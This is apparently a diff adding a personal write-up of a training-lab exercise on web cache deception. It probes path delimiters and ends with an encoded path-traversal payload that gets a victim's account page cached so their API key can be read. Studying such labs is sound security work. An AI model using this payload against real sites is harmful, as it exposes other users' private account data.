@@ -1,0 +1,29 @@
+LAB INFO: Exploiting cache server normalization for web cache deception
+
+GIVEN CREDS: <wiener>:<peter>
+
+TO SOLVE: GET THE API KEY FOR THE CARLOS
+
+ANALYSIS:
+1. Login with the given creds <wiener>:<peter>
+2. Click on the page and send the request to the burp.
+3. View the burp history from there take the dynamic path i.e /my-account here the API Key for the carlos is shown
+4. Now try to play along with it and see on the resonse side has it been cached or not:
+   4.1 /my-account/aa.jpg --> gives an 404 error with no cache
+   4.2 /my-account?a=b.jpg --> gives me 200OK with no cache is being stored
+   4.3 LET'S BRUTEFORCE IT AND TRY TO FIND AN DELIMETER DOES ANYONE IS USED TO BE CACHE OR NOT:
+      4.3.1 /my-account?a.jpg --> we will be bruteforcing this ?
+      4.3.2 while bruteforcing we got 200 res for 4 delimeter i.e ?, # and it's encoded version but not the cache [image]{successful_bruteforce_delimeter}
+      4.3.3 Now the dynamic path /my-account is not being cached so let's try to find another path that may be cached and from there we will try to gain authorize to the path /my-account
+      4.3.4 as we know the delimeter # and ? are correct we will be only focusing on this two
+5. At burp history after viewing the: /resources/labheader/js/submitSolution.js  --> this is being cached [image]{cached}
+6. Now we will be playing with the path...let's remove everything and put only /resources --> check if it's being cached or not --> yes it's being cached with 404 error [image]{resources_cached_with_error}
+7. Now one thing here if i can gain the /my-account path from this resources then I can be success here let's try:
+   7.1 /my-account?resources --> 200OK but no cache here
+   7.2 /my-account#resources --> 200OK but no cache here too
+   7.3 /my-account?/../resources --> gives 200OK with no cache here
+   7.4 /my-account%3f%2f%2e%2e%2fresources --> URL ENCODED SHOWS 200OK but no cache here
+   7.5 /my-account%25%2f%2e%2e%2fresources --> OK this gives me cache but with the 404 error [image][payload_cache_with_error]
+   7.6 MY MISTAKE IS I'VE BEEN USING %25 IT SHOULD BE %23 i.e # => %23
+   7.7 /my-account%23%2f%2e%2e%2fresources --> final working payload have been cached with 200OK res [image]{working_payload}
+8. Now deliver it to victim and get the carlos api key. [image] {carlos_api}
